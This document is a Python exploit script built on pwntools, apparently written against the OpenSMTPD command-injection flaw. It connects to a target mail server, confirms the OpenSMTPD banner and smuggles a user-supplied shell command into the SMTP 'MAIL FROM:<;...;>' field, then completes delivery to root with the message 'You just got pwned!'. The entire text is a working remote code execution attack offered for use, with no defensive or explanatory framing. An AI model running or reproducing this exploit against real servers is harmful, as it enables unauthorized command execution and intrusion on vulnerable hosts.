from pwn import * 
import argparse

parser = argparse.ArgumentParser()

parser.add_argument('--targetHost')
parser.add_argument('--targetPort')
parser.add_argument('--customCommand')

arguments = parser.parse_args()

if arguments.targetHost is None or arguments.targetPort is None:
    log.error("Target host as well as target port need to be set.")

executingCommand = ''
if arguments.customCommand is not None:
    executingCommand = arguments.customCommand
else:
    print("No command specified. Quitting!")


victim = remote(arguments.targetHost, arguments.targetPort)
connectResponse = victim.recvline().decode()
if "OpenSMTPD" not in connectResponse:
    print("Target is not running OpenSMTPD on Port "+str(arguments.targetPort))
    exit(1)

victim.sendline(b"HELO attacker")
heloResponse = victim.recvline().decode()
if "250" not in heloResponse:
    print("HELO failed!")
    exit(1)

log.info('HELO succeeded.')

commandInjection = "MAIL FROM:<;"+executingCommand+";>"
victim.sendline(bytes(commandInjection, encoding='utf-8'))
mailFromResponse = victim.recvline().decode()
if "250" not in mailFromResponse:
    print("Error during command submission!")
    print(mailFromResponse)
    exit(1)
log.success('MAIL FROM payload sucessfully placed.')


victim.sendline(b"RCPT TO:<root>")
mailToResponse = victim.recvline().decode()
if "250" not in mailToResponse:
    print("Recipient is not known!")
    exit(1)


log.progress('Recipient sucessfully set.')

mailData = f"""
You just got pwned!
.
"""

victim.sendline(b"DATA")
victim.recvline()
victim.send(bytes(mailData, encoding='utf-8'))
response = victim.recvline().decode()
log.success('Payload sent successfully!')
victim.sendline(b"QUIT")
